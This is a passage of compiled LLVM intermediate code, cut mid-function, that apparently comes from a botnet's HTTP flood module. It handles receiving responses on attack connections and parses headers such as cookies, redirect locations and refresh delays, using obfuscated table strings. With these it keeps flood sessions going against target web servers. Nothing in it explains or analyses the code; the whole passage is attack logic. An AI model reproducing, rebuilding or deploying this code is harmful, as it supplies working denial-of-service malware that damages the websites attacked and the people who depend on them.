; <label>:417:                                    ; preds = %395, %411
  %418 = load i32, i32* %392, align 4
  %419 = sdiv i32 %418, 64
  %420 = sext i32 %419 to i64
  %421 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 %420
  %422 = load i64, i64* %421, align 8
  %423 = srem i32 %418, 64
  %424 = zext i32 %423 to i64
  %425 = shl i64 1, %424
  %426 = and i64 %425, %422
  %427 = icmp eq i64 %426, 0
  br i1 %427, label %.loopexit617, label %428

; <label>:428:                                    ; preds = %417
  %429 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 1
  %430 = load i8, i8* %429, align 4
  switch i8 %430, label %.loopexit617 [
    i8 6, label %440
    i8 7, label %.preheader616
    i8 10, label %.preheader618.preheader
  ]

.preheader618.preheader:                          ; preds = %428
  br label %.preheader618

.preheader616:                                    ; preds = %428
  %431 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 17
  %432 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 18, i64 0
  %433 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 18, i64 64
  %434 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 18, i64 0
  %435 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 2
  %436 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 14
  %437 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 11
  %438 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 13
  %439 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 15
  br label %854

; <label>:440:                                    ; preds = %428
  call void @util_zero(i8* nonnull %21, i32 10240)
  %441 = load i32, i32* %392, align 4
  %442 = call i64 @recv(i32 %441, i8* nonnull %21, i64 10240, i32 16386) #10
  %443 = trunc i64 %442 to i32
  %444 = icmp slt i32 %443, 1
  br i1 %444, label %445, label %448

; <label>:445:                                    ; preds = %440
  %446 = load i32, i32* %392, align 4
  %447 = call i32 @close(i32 %446) #10
  store i32 -1, i32* %392, align 4
  store i8 0, i8* %429, align 4
  br label %.loopexit617

; <label>:448:                                    ; preds = %440
  %449 = call i32 @util_memsearch(i8* nonnull %21, i32 %443, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 4)
  %450 = icmp eq i32 %449, -1
  %451 = icmp slt i32 %443, 10240
  %or.cond5 = and i1 %451, %450
  br i1 %or.cond5, label %.loopexit617, label %452

; <label>:452:                                    ; preds = %448
  %453 = sext i32 %449 to i64
  %454 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %453
  store i8 0, i8* %454, align 1
  %455 = call i8* @table_retrieve_val(i32 71, i32* null)
  %456 = call i32 @util_stristr(i8* nonnull %21, i32 %443, i8* %455)
  %457 = icmp eq i32 %456, -1
  br i1 %457, label %460, label %458

; <label>:458:                                    ; preds = %452
  %459 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 11
  store i32 2, i32* %459, align 4
  br label %460

; <label>:460:                                    ; preds = %452, %458
  %461 = call i8* @table_retrieve_val(i32 70, i32* null)
  %462 = call i32 @util_stristr(i8* nonnull %21, i32 %443, i8* %461)
  %463 = icmp eq i32 %462, -1
  br i1 %463, label %466, label %464

; <label>:464:                                    ; preds = %460
  %465 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 11
  store i32 1, i32* %465, align 4
  br label %466

; <label>:466:                                    ; preds = %460, %464
  %467 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 12
  store i32 0, i32* %467, align 4
  %468 = call i8* @table_retrieve_val(i32 69, i32* null)
  %469 = call i32 @util_stristr(i8* nonnull %21, i32 %443, i8* %468)
  %470 = icmp eq i32 %469, -1
  br i1 %470, label %495, label %471

; <label>:471:                                    ; preds = %466
  %472 = call i8* @table_retrieve_val(i32 69, i32* null)
  %473 = call i32 @util_stristr(i8* nonnull %21, i32 %443, i8* %472)
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %474
  %476 = load i8, i8* %475, align 1
  %477 = icmp eq i8 %476, 32
  %478 = zext i1 %477 to i32
  %.575 = add nsw i32 %478, %473
  %479 = sext i32 %.575 to i64
  %480 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %479
  %481 = sub nsw i32 %443, %.575
  %482 = call i32 @util_memsearch(i8* %480, i32 %481, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %483 = icmp eq i32 %482, -1
  br i1 %483, label %495, label %484

; <label>:484:                                    ; preds = %471
  %485 = icmp sgt i32 %482, 1
  %486 = add nsw i32 %482, -2
  %.576 = select i1 %485, i32 %486, i32 %482
  %487 = add nsw i32 %.575, %.576
  %488 = sext i32 %487 to i64
  %489 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %488
  store i8 0, i8* %489, align 1
  %490 = call i32 @util_strlen(i8* %480)
  %491 = call i8* @table_retrieve_val(i32 68, i32* null)
  %492 = call i32 @util_stristr(i8* %480, i32 %490, i8* %491)
  %493 = icmp eq i32 %492, 0
  br i1 %493, label %495, label %494

; <label>:494:                                    ; preds = %484
  store i32 1, i32* %467, align 4
  br label %495

; <label>:495:                                    ; preds = %484, %471, %466, %494
  %496 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 13
  store i32 0, i32* %496, align 4
  %497 = call i8* @table_retrieve_val(i32 66, i32* null)
  %498 = call i32 @util_stristr(i8* nonnull %21, i32 %443, i8* %497)
  %499 = icmp eq i32 %498, -1
  br i1 %499, label %524, label %500

; <label>:500:                                    ; preds = %495
  %501 = call i8* @table_retrieve_val(i32 66, i32* null)
  %502 = call i32 @util_stristr(i8* nonnull %21, i32 %443, i8* %501)
  %503 = sext i32 %502 to i64
  %504 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %503
  %505 = load i8, i8* %504, align 1
  %506 = icmp eq i8 %505, 32
  %507 = zext i1 %506 to i32
  %.577 = add nsw i32 %507, %502
  %508 = sext i32 %.577 to i64
  %509 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %508
  %510 = sub nsw i32 %443, %.577
  %511 = call i32 @util_memsearch(i8* %509, i32 %510, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %512 = icmp eq i32 %511, -1
  br i1 %512, label %524, label %513

; <label>:513:                                    ; preds = %500
  %514 = icmp sgt i32 %511, 1
  %515 = add nsw i32 %511, -2
  %.578 = select i1 %514, i32 %515, i32 %511
  %516 = add nsw i32 %.577, %.578
  %517 = sext i32 %516 to i64
  %518 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %517
  store i8 0, i8* %518, align 1
  %519 = call i32 @util_strlen(i8* %509)
  %520 = call i8* @table_retrieve_val(i32 67, i32* null)
  %521 = call i32 @util_stristr(i8* %509, i32 %519, i8* %520)
  %522 = icmp eq i32 %521, 0
  br i1 %522, label %524, label %523

; <label>:523:                                    ; preds = %513
  store i32 1, i32* %496, align 4
  br label %524

; <label>:524:                                    ; preds = %513, %500, %495, %523
  %525 = call i8* @table_retrieve_val(i32 65, i32* null)
  %526 = call i32 @util_stristr(i8* nonnull %21, i32 %443, i8* %525)
  %527 = icmp eq i32 %526, -1
  br i1 %527, label %.sink.split, label %528

; <label>:528:                                    ; preds = %524
  %529 = call i8* @table_retrieve_val(i32 65, i32* null)
  %530 = call i32 @util_stristr(i8* nonnull %21, i32 %443, i8* %529)
  %531 = sext i32 %530 to i64
  %532 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %531
  %533 = load i8, i8* %532, align 1
  %534 = icmp eq i8 %533, 32
  %535 = zext i1 %534 to i32
  %.579 = add nsw i32 %535, %530
  %536 = sext i32 %.579 to i64
  %537 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %536
  %538 = sub nsw i32 %443, %.579
  %539 = call i32 @util_memsearch(i8* %537, i32 %538, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %540 = icmp eq i32 %539, -1
  br i1 %540, label %.preheader615, label %541

; <label>:541:                                    ; preds = %528
  %542 = icmp sgt i32 %539, 1
  %543 = add nsw i32 %539, -2
  %.580 = select i1 %542, i32 %543, i32 %539
  %544 = add nsw i32 %.579, %.580
  %545 = sext i32 %544 to i64
  %546 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %545
  store i8 0, i8* %546, align 1
  %547 = call i32 @util_atoi(i8* %537, i32 10)
  br label %.sink.split

.sink.split:                                      ; preds = %524, %541
  %.sink6 = phi i32 [ %547, %541 ], [ 0, %524 ]
  %548 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 14
  store i32 %.sink6, i32* %548, align 4
  br label %.preheader615

.preheader615:                                    ; preds = %528, %.sink.split
  %549 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 15
  %550 = call i8* @table_retrieve_val(i32 64, i32* null)
  %551 = call i32 @util_stristr(i8* nonnull %58, i32 %443, i8* %550)
  %552 = icmp eq i32 %551, -1
  br i1 %552, label %.critedge581, label %.lr.ph656.preheader

.lr.ph656.preheader:                              ; preds = %.preheader615
  br label %.lr.ph656

.lr.ph656:                                        ; preds = %.lr.ph656.preheader, %.loopexit
  %553 = phi i8* [ %618, %.loopexit ], [ %58, %.lr.ph656.preheader ]
  %.0559655 = phi i32 [ %616, %.loopexit ], [ 0, %.lr.ph656.preheader ]
  %554 = load i32, i32* %549, align 4
  %555 = icmp slt i32 %554, 5
  br i1 %555, label %556, label %.critedge581.loopexit

; <label>:556:                                    ; preds = %.lr.ph656
  %557 = call i8* @table_retrieve_val(i32 64, i32* null)
  %558 = call i32 @util_stristr(i8* %553, i32 %443, i8* %557)
  %559 = add nsw i32 %558, %.0559655
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %560
  %562 = load i8, i8* %561, align 1
  %563 = icmp eq i8 %562, 32
  %564 = zext i1 %563 to i32
  %.582 = add nsw i32 %564, %558
  %565 = sext i32 %.582 to i64
  %566 = getelementptr inbounds i8, i8* %553, i64 %565
  %567 = sub nsw i32 %443, %.0559655
  %568 = sub i32 %567, %.582
  %569 = call i32 @util_memsearch(i8* %566, i32 %568, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %570 = icmp eq i32 %569, -1
  br i1 %570, label %.loopexit, label %571

; <label>:571:                                    ; preds = %556
  %572 = add nsw i32 %.582, %.0559655
  %573 = sext i32 %572 to i64
  %574 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %573
  %575 = icmp sgt i32 %569, 1
  %576 = add nsw i32 %569, -2
  %.583 = select i1 %575, i32 %576, i32 %569
  %577 = call i32 @util_memsearch(i8* %566, i32 %568, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 1)
  %578 = icmp sgt i32 %577, 0
  %579 = add nsw i32 %577, -1
  %..583 = select i1 %578, i32 %579, i32 %.583
  %580 = add nsw i32 %..583, %572
  %581 = sext i32 %580 to i64
  %582 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %581
  store i8 0, i8* %582, align 1
  store i32 0, i32* %5, align 4
  %583 = call i32 @util_strlen(i8* nonnull %574)
  %584 = icmp sgt i32 %583, 0
  br i1 %584, label %.lr.ph649.preheader, label %._crit_edge650

.lr.ph649.preheader:                              ; preds = %571
  br label %.lr.ph649

; <label>:585:                                    ; preds = %.lr.ph649
  %586 = trunc i64 %indvars.iv.next687 to i32
  store i32 %586, i32* %5, align 4
  %587 = call i32 @util_strlen(i8* nonnull %574)
  %588 = sext i32 %587 to i64
  %589 = icmp slt i64 %indvars.iv.next687, %588
  br i1 %589, label %.lr.ph649, label %._crit_edge650.loopexit

.lr.ph649:                                        ; preds = %.lr.ph649.preheader, %585
  %indvars.iv686 = phi i64 [ %indvars.iv.next687, %585 ], [ 0, %.lr.ph649.preheader ]
  %590 = getelementptr inbounds i8, i8* %574, i64 %indvars.iv686
  %591 = load i8, i8* %590, align 1
  %592 = icmp eq i8 %591, 61
  %indvars.iv.next687 = add nuw i64 %indvars.iv686, 1
  br i1 %592, label %._crit_edge650.loopexit, label %585

._crit_edge650.loopexit:                          ; preds = %.lr.ph649, %585
  br label %._crit_edge650

._crit_edge650:                                   ; preds = %._crit_edge650.loopexit, %571
  %593 = load i32, i32* %5, align 4
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds i8, i8* %574, i64 %594
  %596 = load i8, i8* %595, align 1
  %597 = icmp eq i8 %596, 61
  br i1 %597, label %.preheader, label %.loopexit

.preheader:                                       ; preds = %._crit_edge650
  store i32 0, i32* %5, align 4
  %598 = load i32, i32* %549, align 4
  %599 = icmp sgt i32 %598, 0
  br i1 %599, label %.lr.ph653.preheader, label %.critedge584

.lr.ph653.preheader:                              ; preds = %.preheader
  br label %.lr.ph653

; <label>:600:                                    ; preds = %.lr.ph653
  %601 = trunc i64 %indvars.iv.next689 to i32
  store i32 %601, i32* %5, align 4
  %602 = load i32, i32* %549, align 4
  %603 = sext i32 %602 to i64
  %604 = icmp slt i64 %indvars.iv.next689, %603
  br i1 %604, label %.lr.ph653, label %.critedge584.loopexit

.lr.ph653:                                        ; preds = %.lr.ph653.preheader, %600
  %indvars.iv688 = phi i64 [ %indvars.iv.next689, %600 ], [ 0, %.lr.ph653.preheader ]
  %605 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 16, i64 %indvars.iv688, i64 0
  %606 = call signext i8 @util_strncmp(i8* %574, i8* %605, i32 %593)
  %607 = icmp eq i8 %606, 0
  %indvars.iv.next689 = add nuw i64 %indvars.iv688, 1
  br i1 %607, label %600, label %.loopexit.loopexit

.critedge584.loopexit:                            ; preds = %600
  br label %.critedge584

.critedge584:                                     ; preds = %.critedge584.loopexit, %.preheader
  %.lcssa632 = phi i32 [ %598, %.preheader ], [ %602, %.critedge584.loopexit ]
  %608 = call i32 @util_strlen(i8* %574)
  %609 = icmp slt i32 %608, 128
  br i1 %609, label %610, label %.loopexit

; <label>:610:                                    ; preds = %.critedge584
  %611 = sext i32 %.lcssa632 to i64
  %612 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 16, i64 %611, i64 0
  %613 = call i32 @util_strcpy(i8* %612, i8* %574)
  %614 = load i32, i32* %549, align 4
  %615 = add nsw i32 %614, 1
  store i32 %615, i32* %549, align 4
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %.lr.ph653
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %556, %._crit_edge650, %.critedge584, %610
  %616 = add nsw i32 %.582, %.0559655
  %617 = sext i32 %616 to i64
  %618 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %617
  %619 = call i8* @table_retrieve_val(i32 64, i32* null)
  %620 = call i32 @util_stristr(i8* %618, i32 %443, i8* %619)
  %621 = icmp eq i32 %620, -1
  br i1 %621, label %.critedge581.loopexit, label %.lr.ph656

.critedge581.loopexit:                            ; preds = %.loopexit, %.lr.ph656
  br label %.critedge581

.critedge581:                                     ; preds = %.critedge581.loopexit, %.preheader615
  %622 = call i8* @table_retrieve_val(i32 63, i32* null)
  %623 = call i32 @util_stristr(i8* nonnull %21, i32 %443, i8* %622)
  %624 = icmp eq i32 %623, -1
  br i1 %624, label %699, label %625

; <label>:625:                                    ; preds = %.critedge581
  %626 = call i8* @table_retrieve_val(i32 63, i32* null)
  %627 = call i32 @util_stristr(i8* nonnull %21, i32 %443, i8* %626)
  %628 = sext i32 %627 to i64
  %629 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %628
  %630 = load i8, i8* %629, align 1
  %631 = icmp eq i8 %630, 32
  %632 = zext i1 %631 to i32
  %.585 = add nsw i32 %632, %627
  %633 = sext i32 %.585 to i64
  %634 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %633
  %635 = sub nsw i32 %443, %.585
  %636 = call i32 @util_memsearch(i8* %634, i32 %635, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %637 = icmp eq i32 %636, -1
  br i1 %637, label %699, label %638

; <label>:638:                                    ; preds = %625
  %639 = icmp sgt i32 %636, 1
  %640 = add nsw i32 %636, -2
  %.586 = select i1 %639, i32 %640, i32 %636
  %641 = add nsw i32 %.585, %.586
  %642 = sext i32 %641 to i64
  %643 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %642
  store i8 0, i8* %643, align 1
  %644 = add nsw i32 %.586, 1
  %645 = call i32 @util_memsearch(i8* %634, i32 %644, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0), i32 4)
  %646 = icmp eq i32 %645, 4
  br i1 %646, label %647, label %685

; <label>:647:                                    ; preds = %638
  %648 = getelementptr inbounds i8, i8* %634, i64 4
  %649 = load i8, i8* %648, align 1
  %650 = icmp eq i8 %649, 115
  %.587 = select i1 %650, i32 8, i32 7
  store i32 %.587, i32* %5, align 4
  %651 = zext i32 %.587 to i64
  %652 = getelementptr inbounds i8, i8* %634, i64 %651
  %653 = sub nsw i32 %644, %.587
  %654 = sext i32 %653 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %634, i8* %652, i64 %654, i32 1, i1 false)
  br label %655

; <label>:655:                                    ; preds = %660, %647
  %indvars.iv690 = phi i64 [ %indvars.iv.next691, %660 ], [ 0, %647 ]
  %656 = getelementptr inbounds i8, i8* %634, i64 %indvars.iv690
  %657 = load i8, i8* %656, align 1
  switch i8 %657, label %660 [
    i8 0, label %.loopexit614
    i8 47, label %658
  ]

; <label>:658:                                    ; preds = %655
  %659 = trunc i64 %indvars.iv690 to i32
  store i32 %659, i32* %5, align 4
  store i8 0, i8* %656, align 1
  br label %662

; <label>:660:                                    ; preds = %655
  %indvars.iv.next691 = add nuw i64 %indvars.iv690, 1
  br label %655

.loopexit614:                                     ; preds = %655
  %661 = trunc i64 %indvars.iv690 to i32
  store i32 %661, i32* %5, align 4
  br label %662

; <label>:662:                                    ; preds = %.loopexit614, %658
  %663 = call i32 @util_strlen(i8* nonnull %634)
  %.off609 = add i32 %663, -1
  %664 = icmp ult i32 %.off609, 127
  br i1 %664, label %665, label %668

; <label>:665:                                    ; preds = %662
  %666 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 7, i64 0
  %667 = call i32 @util_strcpy(i8* %666, i8* nonnull %634)
  br label %668

; <label>:668:                                    ; preds = %665, %662
  %669 = load i32, i32* %5, align 4
  %670 = add nsw i32 %669, 1
  %671 = sext i32 %670 to i64
  %672 = getelementptr inbounds i8, i8* %634, i64 %671
  %673 = call i32 @util_strlen(i8* %672)
  %674 = icmp slt i32 %673, 256
  br i1 %674, label %675, label %698

; <label>:675:                                    ; preds = %668
  %676 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 6, i64 1
  call void @util_zero(i8* %676, i32 255)
  %677 = load i32, i32* %5, align 4
  %678 = add nsw i32 %677, 1
  %679 = sext i32 %678 to i64
  %680 = getelementptr inbounds i8, i8* %634, i64 %679
  %681 = call i32 @util_strlen(i8* %680)
  %682 = icmp sgt i32 %681, 0
  br i1 %682, label %683, label %698

; <label>:683:                                    ; preds = %675
  %684 = call i32 @util_strcpy(i8* %676, i8* %680)
  br label %698

; <label>:685:                                    ; preds = %638
  %686 = load i8, i8* %634, align 1
  %687 = icmp eq i8 %686, 47
  br i1 %687, label %688, label %698

; <label>:688:                                    ; preds = %685
  %689 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 6, i64 1
  call void @util_zero(i8* %689, i32 255)
  %690 = load i32, i32* %5, align 4
  %691 = add nsw i32 %690, 1
  %692 = sext i32 %691 to i64
  %693 = getelementptr inbounds i8, i8* %634, i64 %692
  %694 = call i32 @util_strlen(i8* %693)
  %.off608 = add i32 %694, -1
  %695 = icmp ult i32 %.off608, 255
  br i1 %695, label %696, label %698

; <label>:696:                                    ; preds = %688
  %697 = call i32 @util_strcpy(i8* %689, i8* %693)
  br label %698

; <label>:698:                                    ; preds = %685, %696, %688, %668, %683, %675
  store i8 1, i8* %429, align 4
  br label %.loopexit617

; <label>:699:                                    ; preds = %625, %.critedge581
  %700 = call i8* @table_retrieve_val(i32 62, i32* null)
  %701 = call i32 @util_stristr(i8* nonnull %21, i32 %443, i8* %700)
  %702 = icmp eq i32 %701, -1
  br i1 %702, label %840, label %703

; <label>:703:                                    ; preds = %699
  %704 = call i8* @table_retrieve_val(i32 62, i32* null)
  %705 = call i32 @util_stristr(i8* nonnull %21, i32 %443, i8* %704)
  %706 = sext i32 %705 to i64
  %707 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %706
  %708 = load i8, i8* %707, align 1
  %709 = icmp eq i8 %708, 32
  %710 = zext i1 %709 to i32
  %.588 = add nsw i32 %710, %705
  %711 = sext i32 %.588 to i64
  %712 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %711
  %713 = sub nsw i32 %443, %.588
  %714 = call i32 @util_memsearch(i8* %712, i32 %713, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %715 = icmp eq i32 %714, -1
  br i1 %715, label %840, label %716

; <label>:716:                                    ; preds = %703
  %717 = icmp sgt i32 %714, 1
  %718 = add nsw i32 %714, -2
  %.589 = select i1 %717, i32 %718, i32 %714
  %719 = add nsw i32 %.588, %.589
  %720 = sext i32 %719 to i64
  %721 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %720
  store i8 0, i8* %721, align 1
  br label %722

; <label>:722:                                    ; preds = %722, %716
  %indvars.iv692 = phi i64 [ %indvars.iv.next693, %722 ], [ 0, %716 ]
  %723 = getelementptr inbounds i8, i8* %712, i64 %indvars.iv692
  %724 = load i8, i8* %723, align 1
  %.off610 = add i8 %724, -48
  %725 = icmp ult i8 %.off610, 10
  %indvars.iv.next693 = add nuw i64 %indvars.iv692, 1
  br i1 %725, label %722, label %.critedge

.critedge:                                        ; preds = %722
  %726 = add nsw i32 %.589, 1
  %727 = trunc i64 %indvars.iv692 to i32
  store i32 %727, i32* %5, align 4
  %728 = icmp eq i8 %724, 0
  br i1 %728, label %840, label %729

; <label>:729:                                    ; preds = %.critedge
  store i8 0, i8* %723, align 1
  %730 = load i32, i32* %5, align 4
  %731 = add nsw i32 %730, 1
  store i32 %731, i32* %5, align 4
  %732 = sext i32 %731 to i64
  %733 = getelementptr inbounds i8, i8* %712, i64 %732
  %734 = load i8, i8* %733, align 1
  %735 = icmp eq i8 %734, 32
  br i1 %735, label %736, label %738

; <label>:736:                                    ; preds = %729
  %737 = add nsw i32 %730, 2
  store i32 %737, i32* %5, align 4
  br label %738

; <label>:738:                                    ; preds = %736, %729
  %739 = load i32, i32* %5, align 4
  %740 = sext i32 %739 to i64
  %741 = getelementptr inbounds i8, i8* %712, i64 %740
  %742 = call i32 @util_strlen(i8* %741)
  %743 = call i32 @util_stristr(i8* %741, i32 %742, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0))
  %744 = icmp eq i32 %743, -1
  br i1 %744, label %747, label %745

; <label>:745:                                    ; preds = %738
  %746 = add nsw i32 %743, %739
  store i32 %746, i32* %5, align 4
  br label %747

; <label>:747:                                    ; preds = %738, %745
  %748 = load i32, i32* %5, align 4
  %749 = sext i32 %748 to i64
  %750 = getelementptr inbounds i8, i8* %712, i64 %749
  %751 = load i8, i8* %750, align 1
  %752 = icmp eq i8 %751, 34
  br i1 %752, label %753, label %764

; <label>:753:                                    ; preds = %747
  %754 = add nsw i32 %748, 1
  store i32 %754, i32* %5, align 4
  %755 = sext i32 %754 to i64
  %756 = getelementptr inbounds i8, i8* %712, i64 %755
  %757 = call i32 @util_strlen(i8* %756)
  %758 = add nsw i32 %757, -1
  %759 = sext i32 %758 to i64
  %760 = getelementptr inbounds i8, i8* %756, i64 %759
  %761 = load i8, i8* %760, align 1
  %762 = icmp eq i8 %761, 34
  br i1 %762, label %763, label %764

; <label>:763:                                    ; preds = %753
  store i8 0, i8* %760, align 1
  br label %764

; <label>:764:                                    ; preds = %753, %763, %747
  %765 = call i32 @util_atoi(i8* nonnull %712, i32 10)
  %766 = add i32 %765, %390
  %767 = zext i32 %766 to i64
  %.off = add i32 %765, -1
  %768 = icmp ult i32 %.off, 9
  br i1 %768, label %.lr.ph660.preheader, label %.critedge12

.lr.ph660.preheader:                              ; preds = %764
  %769 = call i64 @time(i64* null) #10
  %770 = icmp sgt i64 %767, %769
  br i1 %770, label %.lr.ph660.preheader737, label %.critedge12

.lr.ph660.preheader737:                           ; preds = %.lr.ph660.preheader
  br label %.lr.ph660

.lr.ph660:                                        ; preds = %.lr.ph660.preheader737, %.lr.ph660
  %771 = call i32 @sleep(i32 1) #10
  %772 = call i64 @time(i64* null) #10
  %773 = icmp sgt i64 %767, %772
  br i1 %773, label %.lr.ph660, label %.critedge12.loopexit

.critedge12.loopexit:                             ; preds = %.lr.ph660
  br label %.critedge12

.critedge12:                                      ; preds = %.critedge12.loopexit, %.lr.ph660.preheader, %764
  %774 = load i32, i32* %5, align 4
  %775 = sext i32 %774 to i64
  %776 = getelementptr inbounds i8, i8* %712, i64 %775
  %777 = call i32 @util_strlen(i8* %776)
  %778 = call i32 @util_stristr(i8* %776, i32 %777, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0))
  %779 = icmp eq i32 %778, 4
  br i1 %779, label %780, label %818

; <label>:780:                                    ; preds = %.critedge12
  %781 = getelementptr inbounds i8, i8* %776, i64 4
  %782 = load i8, i8* %781, align 1
  %783 = icmp eq i8 %782, 115
  %.592 = select i1 %783, i32 8, i32 7
  store i32 %.592, i32* %5, align 4
  %784 = zext i32 %.592 to i64
  %785 = getelementptr inbounds i8, i8* %776, i64 %784
  %786 = sub i32 %726, %.592
  %787 = sext i32 %786 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %776, i8* %785, i64 %787, i32 1, i1 false)
  br label %788

; <label>:788:                                    ; preds = %793, %780
  %indvars.iv694 = phi i64 [ %indvars.iv.next695, %793 ], [ 0, %780 ]
  %789 = getelementptr inbounds i8, i8* %776, i64 %indvars.iv694
  %790 = load i8, i8* %789, align 1
  switch i8 %790, label %793 [
    i8 0, label %.loopexit613
    i8 47, label %791
  ]

; <label>:791:                                    ; preds = %788
  %792 = trunc i64 %indvars.iv694 to i32
  store i32 %792, i32* %5, align 4
  store i8 0, i8* %789, align 1
  br label %795

; <label>:793:                                    ; preds = %788
  %indvars.iv.next695 = add nuw i64 %indvars.iv694, 1
  br label %788

.loopexit613:                                     ; preds = %788
  %794 = trunc i64 %indvars.iv694 to i32
  store i32 %794, i32* %5, align 4
  br label %795

; <label>:795:                                    ; preds = %.loopexit613, %791
  %796 = call i32 @util_strlen(i8* nonnull %776)
  %.off611 = add i32 %796, -1
  %797 = icmp ult i32 %.off611, 127
  br i1 %797, label %798, label %801

; <label>:798:                                    ; preds = %795
  %799 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 7, i64 0
  %800 = call i32 @util_strcpy(i8* %799, i8* nonnull %776)
  br label %801

; <label>:801:                                    ; preds = %798, %795
  %802 = load i32, i32* %5, align 4
  %803 = add nsw i32 %802, 1
  %804 = sext i32 %803 to i64
  %805 = getelementptr inbounds i8, i8* %776, i64 %804
  %806 = call i32 @util_strlen(i8* %805)
  %807 = icmp slt i32 %806, 256
  br i1 %807, label %808, label %837

; <label>:808:                                    ; preds = %801
  %809 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %49, i64 %indvars.iv696, i32 6, i64 1
  call void @util_zero(i8* %809, i32 255)
  %810 = load i32, i32* %5, align 4
  %811 = add nsw i32 %810, 1
  %812 = sext i32 %811 to i64
  %813 = getelementptr inbounds i8, i8* %776, i64 %812
  %814 = call i32 @util_strlen(i8* %813)
  %815 = icmp sgt i32 %814, 0
  br i1 %815, label %816, label %837

; <label>:816:                                    ; preds = %808
  %817 = call i32 @util_strcpy(i8* %809, i8* %813)
  br label %837

; <label>:818:                                    ; preds = %.critedge12
  %819 = load i8, i8* %776, align 1
  %820 = icmp eq i8 %819, 47
  br i1 %820, label %821, label %837

; <label>:821:                                    ; preds = %818
  %822 = add nsw i32 %774, 1
  %823 = sext i32 %822 to i64
  %824 = getelementptr inbounds i8, i8* %776, i64 %823
  %825 = call i32 @util_strlen(i8* %824)
  %826 = icmp slt i32 %825, 256
  br i1 %826, label %827, label %837

; <label>:827:                                    ; preds = %821
